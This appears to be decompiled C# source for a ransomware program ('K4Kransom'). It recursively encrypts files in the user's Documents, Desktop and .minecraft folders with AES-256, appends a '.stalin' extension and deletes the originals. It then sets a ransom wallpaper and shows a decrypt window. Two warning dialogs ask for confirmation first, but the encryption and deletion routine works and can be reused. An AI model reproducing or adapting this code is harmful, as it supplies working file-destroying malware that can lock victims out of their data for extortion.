using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Windows.Forms;
using Encrypter.Properties;
using Microsoft.Win32;

namespace Encrypter;

internal class Program
{
	public static string ext = "stalin";

	public static string password = "KKosty4ka";

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	public static void FileEncrypt(string inputFile, string password)
	{
		try
		{
			byte[] array = GenerateRandomSalt();
			FileStream fileStream = new FileStream(inputFile + "." + ext, FileMode.Create);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CFB;
			fileStream.Write(array, 0, array.Length);
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
			byte[] array2 = new byte[1048576];
			try
			{
				int count;
				while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
				{
					cryptoStream.Write(array2, 0, count);
				}
				fileStream2.Close();
				File.Delete(inputFile);
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error: " + ex.Message);
			}
			finally
			{
				cryptoStream.Close();
				fileStream.Close();
			}
		}
		catch
		{
		}
	}

	public static void FileDecrypt(string inputFile, string outputFile, string password)
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			byte[] array = new byte[32];
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			fileStream.Read(array, 0, array.Length);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Mode = CipherMode.CFB;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
			FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
			byte[] array2 = new byte[1048576];
			try
			{
				int count;
				while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
				{
					fileStream2.Write(array2, 0, count);
				}
			}
			catch (CryptographicException ex)
			{
				Console.WriteLine("CryptographicException error: " + ex.Message);
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Error: " + ex2.Message);
			}
			try
			{
				cryptoStream.Close();
				File.Delete(inputFile);
			}
			catch (Exception ex3)
			{
				Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
			}
			finally
			{
				fileStream2.Close();
				fileStream.Close();
			}
		}
		catch
		{
		}
	}

	public static IEnumerable<string> Traverse(string rootDirectory)
	{
		try
		{
			IEnumerable<string> files = Enumerable.Empty<string>();
			IEnumerable<string> directories = Enumerable.Empty<string>();
			try
			{
				FileIOPermission permission = new FileIOPermission((FileIOPermissionAccess)8, rootDirectory);
				((CodeAccessPermission)permission).Demand();
				files = Directory.GetFiles(rootDirectory);
				directories = Directory.GetDirectories(rootDirectory);
			}
			catch
			{
				rootDirectory = null;
			}
			if (rootDirectory != null)
			{
				yield return rootDirectory;
			}
			foreach (string item in files)
			{
				yield return item;
			}
			IEnumerable<string> subdirectoryItems = directories.SelectMany(Traverse);
			foreach (string item2 in subdirectoryItems)
			{
				yield return item2;
			}
		}
		finally
		{
		}
	}

	public static IEnumerable<string> Files()
	{
		string[] paths = new string[3]
		{
			(string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "AppData", "%USERPROFILE%\\AppData\\Roaming") + "\\.minecraft",
			(string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "Personal", "%USERPROFILE%\\Documents"),
			(string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "Desktop", "%USERPROFILE%\\Desktop")
		};
		string[] array = paths;
		foreach (string dir in array)
		{
			foreach (string file in Traverse(dir))
			{
				if (file != Process.GetCurrentProcess().MainModule!.FileName)
				{
					yield return file;
				}
			}
		}
	}

	public static void Decrypt()
	{
		foreach (string item in Files())
		{
			if (!File.GetAttributes(item).HasFlag(FileAttributes.Directory) && Path.GetExtension(item) == "." + ext)
			{
				FileDecrypt(item, item.Substring(0, item.Length - (ext.Length + 1)), item.Substring(0, item.Length - (ext.Length + 1)) + password);
			}
		}
	}

	public static void Encrypt()
	{
		foreach (string item in Files())
		{
			if (!File.GetAttributes(item).HasFlag(FileAttributes.Directory) && Path.GetExtension(item) != "." + ext)
			{
				FileEncrypt(item, item + password);
			}
		}
	}

	private static void Main(string[] args)
	{
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Invalid comparison between Unknown and I4
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Invalid comparison between Unknown and I4
		if (args.Contains("decrypt") || File.Exists("C:\\K4Kransom.dat"))
		{
			Application.Run((Form)(object)new Decrypt());
			Application.Exit();
		}
		DialogResult val = MessageBox.Show("WARNING!\n\nThis program will encrypt your files!\nDo you REALLY want to run it?", "WARNING!", (MessageBoxButtons)4, (MessageBoxIcon)48, (MessageBoxDefaultButton)256);
		if ((int)val == 6)
		{
			val = MessageBox.Show("LAST WARNING!\n\nThis is the last warning!\nAfter you click \"yes\" button, all your files will be encrypted\nDo you REALLY want to run it?", "LAST WARNING!", (MessageBoxButtons)4, (MessageBoxIcon)48, (MessageBoxDefaultButton)256);
			if ((int)val == 6)
			{
				File.Create("C:\\K4Kransom.dat");
				Encrypt();
				((Image)Resources.wallpaper).Save(Path.Combine(Path.GetTempPath(), "wallpaper.png"));
				Wallpaper.Set(new Uri(Path.Combine(Path.GetTempPath(), "wallpaper.png")), Wallpaper.Style.Stretched);
				Application.Run((Form)(object)new Decrypt());
			}
		}
	}
}
